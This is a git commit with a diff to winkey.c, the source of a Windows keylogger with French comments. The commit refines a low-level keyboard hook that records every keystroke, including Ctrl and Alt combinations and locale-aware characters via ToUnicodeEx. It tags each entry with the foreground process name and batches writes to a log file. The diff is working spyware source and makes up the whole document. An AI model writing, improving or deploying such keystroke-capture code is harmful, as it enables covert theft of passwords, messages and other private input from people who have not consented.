f282c7a3fde53af6ed52ceb0a7a514472ef962c7
Stone <sdummett.dev@proton.me>
2024-08-24 20:29:54 +0200

    Refactor and optimize keyboard handling and logging
    - Change `get_character` return type to `const char*` to prevent modification.
    - Add `remove_brackets` function to clean up strings.
    - Modify `LowLevelKeyboardProc` to handle `Ctrl` and `Alt` key combinations by removing existing brackets.
    - Introduce static counter `write_count` in `write_to_log` to track log writes and call `fflush` every 30 writes for performance.
    - Update `get_character` to use `ToUnicodeEx` for better locale support.
    - Refactor `get_special_key_name` for improved readability.

--- winkey.c
+++ winkey.c
@@ -21,7 +21,7 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 static void write_to_log(const char* str);
 static void log_new_window(const char* process_name);
 static const char* get_special_key_name(DWORD vkCode);
-static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
+static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
 
 // Fonction principale
 int main(void)
@@ -52,6 +52,21 @@ int main(void)
     UnhookWindowsHookEx(g_hook);
     fclose(g_logfile);
     return 0;
+}
+
+// Fonction pour retirer les brackets
+static void remove_brackets(char* str)
+{
+    char* src = str;
+    char* dest = str;
+
+    while (*src) {
+        if (*src != '[' && *src != ']') {
+            *dest++ = *src;
+        }
+        src++;
+    }
+    *dest = '\0';
 }
 
 // Fonction de hook pour capturer les frappes
@@ -85,12 +100,14 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 
         // Gérer les combinaisons de touches (e.g., Ctrl+C)
         char tmp_key[32] = { 0 };
-        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
-            sprintf(tmp_key, "[Ctrl+%s]", key);
-			strcpy(key, tmp_key);
-        }
         if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // Alt key
+			remove_brackets(key);
             sprintf(tmp_key, "[Alt+%s]", key);
+            strcpy(key, tmp_key);
+        }
+        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
+			remove_brackets(key);
+            sprintf(tmp_key, "[Ctrl+%s]", key);
 			strcpy(key, tmp_key);
         }
 
@@ -116,6 +133,8 @@ static void log_new_window(const char* process_name)
 // Fonction pour écrire dans le fichier log
 static void write_to_log(const char* str)
 {
+    static int write_count = 0;  // Compteur pour suivre le nombre d'appels
+
     // Obtenir la fenêtre et le processus en premier plan
     HWND foreground_window = GetForegroundWindow();
     DWORD pid;
@@ -136,25 +155,37 @@ static void write_to_log(const char* str)
             if (strcmp(g_last_process, process_name) != 0) {
                 strcpy(g_last_process, process_name);
             }
+			fflush(g_logfile);
+			write_count = 0;
             log_new_window(process_name);
         }
     }
     fprintf(g_logfile, "%s", str);
-    fflush(g_logfile);
+
+    // Incrémenter le compteur d'écritures
+    write_count++;
+
+    // Effectuer un fflush tous les 30 appels
+    if (write_count >= 30) {
+        fflush(g_logfile);
+        write_count = 0;  // Réinitialiser le compteur
+    }
 }
 
-static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
+static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
 {
     static char key[2] = { 0 }; // Static pour retourner un pointeur valide
+    HKL keyboardLayout = GetKeyboardLayout(0); // Obtient la disposition de clavier pour le thread actuel
 
-    // Conversion de la touche en fonction de l'état actuel du clavier
-    if (ToAscii(vkCode, scanCode, keyboardState, (LPWORD)key, 0) == 1) {
+    // Utiliser ToUnicodeEx pour gérer les locales et les dispositions de clavier
+    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, (LPWSTR)key, sizeof(key), 0, keyboardLayout);
+
+    if (result == 1) {
+        // Gestion des majuscules/minuscules
         if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
-            // Convertir en majuscule
             key[0] = (char)toupper(key[0]);
         }
         else if (!isShiftPressed && !isCapsLockOn) {
-            // Convertir en minuscule
             key[0] = (char)tolower(key[0]);
         }
     }
@@ -168,181 +199,93 @@ static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BO
 static const char* get_special_key_name(DWORD vkCode)
 {
     switch (vkCode) {
-    case VK_TAB:
-        return "[Tab]";
-    case VK_RETURN:
-        return "[Enter]";
-    case VK_BACK:
-        return "[Backspace]";
-	case VK_CAPITAL:
-		return "";   
-    case VK_ESCAPE:
-        return "[Esc]";
-    case VK_SPACE:
-        return "[Space]";
-    case VK_PRIOR:
-        return "[Page Up]";
-    case VK_NEXT:
-        return "[Page Down]";
-    case VK_END:
-        return "[End]";
-    case VK_HOME:
-        return "[Home]";
-    case VK_LEFT:
-        return "[Left Arrow]";
-    case VK_UP:
-        return "[Up Arrow]";
-    case VK_RIGHT:
-        return "[Right Arrow]";
-    case VK_DOWN:
-        return "[Down Arrow]";
-    case VK_INSERT:
-        return "[Insert]";
-    case VK_DELETE:
-        return "[Delete]";
-    case VK_LWIN:
-        return "[Left Windows]";
-    case VK_RWIN:
-        return "[Right Windows]";
-    case VK_APPS:
-        return "[Application]";
-    case VK_SLEEP:
-        return "[Sleep]";
-    case VK_NUMPAD0:
-        return "[Numpad 0]";
-    case VK_NUMPAD1:
-        return "[Numpad 1]";
-    case VK_NUMPAD2:
-        return "[Numpad 2]";
-    case VK_NUMPAD3:
-        return "[Numpad 3]";
-    case VK_NUMPAD4:
-        return "[Numpad 4]";
-    case VK_NUMPAD5:
-        return "[Numpad 5]";
-    case VK_NUMPAD6:
-        return "[Numpad 6]";
-    case VK_NUMPAD7:
-        return "[Numpad 7]";
-    case VK_NUMPAD8:
-        return "[Numpad 8]";
-    case VK_NUMPAD9:
-        return "[Numpad 9]";
-    case VK_MULTIPLY:
-        return "[Numpad *]";
-    case VK_ADD:
-        return "[Numpad +]";
-    case VK_SEPARATOR:
-        return "[Numpad Separator]";
-    case VK_SUBTRACT:
-        return "[Numpad -]";
-    case VK_DECIMAL:
-        return "[Numpad .]";
-    case VK_DIVIDE:
-        return "[Numpad /]";
-    case VK_F1:
-        return "[F1]";
-    case VK_F2:
-        return "[F2]";
-    case VK_F3:
-        return "[F3]";
-    case VK_F4:
-        return "[F4]";
-    case VK_F5:
-        return "[F5]";
-    case VK_F6:
-        return "[F6]";
-    case VK_F7:
-        return "[F7]";
-    case VK_F8:
-        return "[F8]";
-    case VK_F9:
-        return "[F9]";
-    case VK_F10:
-        return "[F10]";
-    case VK_F11:
-        return "[F11]";
-    case VK_F12:
-        return "[F12]";
-    case VK_NUMLOCK:
-        return "[Num Lock]";
-    case VK_SCROLL:
-        return "[Scroll Lock]";
-    case VK_LSHIFT:
-        return "";
-    case VK_RSHIFT:
-        return "";
-    case VK_LCONTROL:
-        return "";
-    case VK_RCONTROL:
-        return "";
-    case VK_LMENU:
-        return "";
-    case VK_RMENU:
-        return "";
-    case VK_VOLUME_MUTE:
-        return "[Volume Mute]";
-    case VK_VOLUME_DOWN:
-        return "[Volume Down]";
-    case VK_VOLUME_UP:
-        return "[Volume Up]";
-    case VK_MEDIA_NEXT_TRACK:
-        return "[Next Track]";
-    case VK_MEDIA_PREV_TRACK:
-        return "[Previous Track]";
-    case VK_MEDIA_STOP:
-        return "[Stop Media]";
-    case VK_MEDIA_PLAY_PAUSE:
-        return "[Play/Pause Media]";
-    case VK_LAUNCH_MAIL:
-        return "[Launch Mail]";
-    case VK_LAUNCH_MEDIA_SELECT:
-        return "[Launch Media Select]";
-    case VK_LAUNCH_APP1:
-        return "[Launch App 1]";
-    case VK_LAUNCH_APP2:
-        return "[Launch App 2]";
-    case VK_BROWSER_BACK:
-        return "[Browser Back]";
-    case VK_BROWSER_FORWARD:
-        return "[Browser Forward]";
-    case VK_BROWSER_REFRESH:
-        return "[Browser Refresh]";
-    case VK_BROWSER_STOP:
-        return "[Browser Stop]";
-    case VK_BROWSER_SEARCH:
-        return "[Browser Search]";
-    case VK_BROWSER_FAVORITES:
-        return "[Browser Favorites]";
-    case VK_BROWSER_HOME:
-        return "[Browser Home]";
-    case VK_OEM_1:
-        return "[OEM 1 (;:)]";
-    case VK_OEM_PLUS:
-        return "[OEM Plus (+)]";
-    case VK_OEM_COMMA:
-        return "[OEM Comma (,)]";
-    case VK_OEM_MINUS:
-        return "[OEM Minus (-)]";
-    case VK_OEM_PERIOD:
-        return "[OEM Period (.)]";
-    case VK_OEM_2:
-        return "[OEM 2 (/?) ]";
-    case VK_OEM_3:
-        return "[OEM 3 (`~)]";
-    case VK_OEM_4:
-        return "[OEM 4 ([{)]";
-    case VK_OEM_5:
-        return "[OEM 5 (\\|)]";
-    case VK_OEM_6:
-        return "[OEM 6 (]}])]";
-    case VK_OEM_7:
-        return "[OEM 7 ('\") ]";
-    case VK_OEM_8:
-        return "[OEM 8]";
-    case VK_OEM_102:
-        return "[OEM 102 (<|>)]";
-    default:
-        return "[Unknown Key]";
+    case VK_TAB: return "[Tab]";
+    case VK_RETURN: return "[Enter]";
+    case VK_BACK: return "[Backspace]";
+    case VK_CAPITAL: return "";
+    case VK_ESCAPE: return "[Esc]";
+    case VK_SPACE: return "[Space]";
+    case VK_PRIOR: return "[Page Up]";
+    case VK_NEXT: return "[Page Down]";
+    case VK_END: return "[End]";
+    case VK_HOME: return "[Home]";
+    case VK_LEFT: return "[Left Arrow]";
+    case VK_UP: return "[Up Arrow]";
+    case VK_RIGHT: return "[Right Arrow]";
+    case VK_DOWN: return "[Down Arrow]";
+    case VK_INSERT: return "[Insert]";
+    case VK_DELETE: return "[Delete]";
+    case VK_LWIN: return "[Left Windows]";
+    case VK_RWIN: return "[Right Windows]";
+    case VK_APPS: return "[Application]";
+    case VK_SLEEP: return "[Sleep]";
+    case VK_NUMPAD0: return "[Numpad 0]";
+    case VK_NUMPAD1: return "[Numpad 1]";
+    case VK_NUMPAD2: return "[Numpad 2]";
+    case VK_NUMPAD3: return "[Numpad 3]";
+    case VK_NUMPAD4: return "[Numpad 4]";
+    case VK_NUMPAD5: return "[Numpad 5]";
+    case VK_NUMPAD6: return "[Numpad 6]";
+    case VK_NUMPAD7: return "[Numpad 7]";
+    case VK_NUMPAD8: return "[Numpad 8]";
+    case VK_NUMPAD9: return "[Numpad 9]";
+    case VK_MULTIPLY: return "[Numpad *]";
+    case VK_ADD: return "[Numpad +]";
+    case VK_SEPARATOR: return "[Numpad Separator]";
+    case VK_SUBTRACT: return "[Numpad -]";
+    case VK_DECIMAL: return "[Numpad .]";
+    case VK_DIVIDE: return "[Numpad /]";
+    case VK_F1: return "[F1]";
+    case VK_F2: return "[F2]";
+    case VK_F3: return "[F3]";
+    case VK_F4: return "[F4]";
+    case VK_F5: return "[F5]";
+    case VK_F6: return "[F6]";
+    case VK_F7: return "[F7]";
+    case VK_F8: return "[F8]";
+    case VK_F9: return "[F9]";
+    case VK_F10: return "[F10]";
+    case VK_F11: return "[F11]";
+    case VK_F12: return "[F12]";
+    case VK_NUMLOCK: return "[Num Lock]";
+    case VK_SCROLL: return "[Scroll Lock]";
+    case VK_LSHIFT: return "";
+    case VK_RSHIFT: return "";
+    case VK_LCONTROL: return "";
+    case VK_RCONTROL: return "";
+    case VK_LMENU: return "";
+    case VK_RMENU: return "";
+    case VK_VOLUME_MUTE: return "[Volume Mute]";
+    case VK_VOLUME_DOWN: return "[Volume Down]";
+    case VK_VOLUME_UP: return "[Volume Up]";
+    case VK_MEDIA_NEXT_TRACK: return "[Next Track]";
+    case VK_MEDIA_PREV_TRACK: return "[Previous Track]";
+    case VK_MEDIA_STOP: return "[Stop Media]";
+    case VK_MEDIA_PLAY_PAUSE: return "[Play/Pause Media]";
+    case VK_LAUNCH_MAIL: return "[Launch Mail]";
+    case VK_LAUNCH_MEDIA_SELECT: return "[Launch Media Select]";
+    case VK_LAUNCH_APP1: return "[Launch App 1]";
+    case VK_LAUNCH_APP2: return "[Launch App 2]";
+    case VK_BROWSER_BACK: return "[Browser Back]";
+    case VK_BROWSER_FORWARD: return "[Browser Forward]";
+    case VK_BROWSER_REFRESH: return "[Browser Refresh]";
+    case VK_BROWSER_STOP: return "[Browser Stop]";
+    case VK_BROWSER_SEARCH: return "[Browser Search]";
+    case VK_BROWSER_FAVORITES: return "[Browser Favorites]";
+    case VK_BROWSER_HOME: return "[Browser Home]";
+    case VK_OEM_1: return "[OEM 1 (;:)]";
+    case VK_OEM_PLUS: return "[OEM Plus (+)]";
+    case VK_OEM_COMMA: return "[OEM Comma (,)]";
+    case VK_OEM_MINUS: return "[OEM Minus (-)]";
+    case VK_OEM_PERIOD: return "[OEM Period (.)]";
+    case VK_OEM_2: return "[OEM 2 (/?) ]";
+    case VK_OEM_3: return "[OEM 3 (`~)]";
+    case VK_OEM_4: return "[OEM 4 ([{)]";
+    case VK_OEM_5: return "[OEM 5 (\\|)]";
+    case VK_OEM_6: return "[OEM 6 (]}])]";
+    case VK_OEM_7: return "[OEM 7 ('\") ]";
+    case VK_OEM_8: return "[OEM 8]";
+    case VK_OEM_102: return "[OEM 102 (<|>)]";
+    default: return "[Unknown Key]";
     }
 }
